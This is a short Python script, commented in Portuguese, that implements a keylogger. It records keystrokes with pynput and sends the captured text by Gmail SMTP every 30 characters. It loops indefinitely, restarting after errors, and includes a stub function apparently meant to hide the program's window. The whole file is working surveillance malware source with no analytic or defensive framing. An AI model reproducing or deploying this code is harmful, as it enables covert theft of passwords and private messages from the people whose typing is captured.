import smtplib
import subprocess
import time
from pynput.keyboard import Key, Listener
from tkinter import *

email = 'seuemail@gmail.com'
password = 'seucodigo'
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)
#No password, no gmail, deve-se habilitar no campo 'Segurança' e em 'Chaves de acesso e de segurança', assim com o código de uma nova senha, você realiza a conexão do código com o gmail. É esse que deve ser preenchido no campo password

fullog = ''
words = ''
email_char_limit = 30  # Alterado para 30

def on_press(key):
    global words
    global fullog
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        words += ' '
        fullog += words
        words = ''

        if len(fullog) >= email_char_limit:
            send_log()
            fullog = ''

    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        words = words[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        words += char

    if key == Key.esc:
        return False

def send_log():
    server.sendmail(
        email,
        email,
        fullog.encode('utf-8')
    )

while True:
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except:
        time.sleep(3)

def hide(second=None):
    second.withdraw()
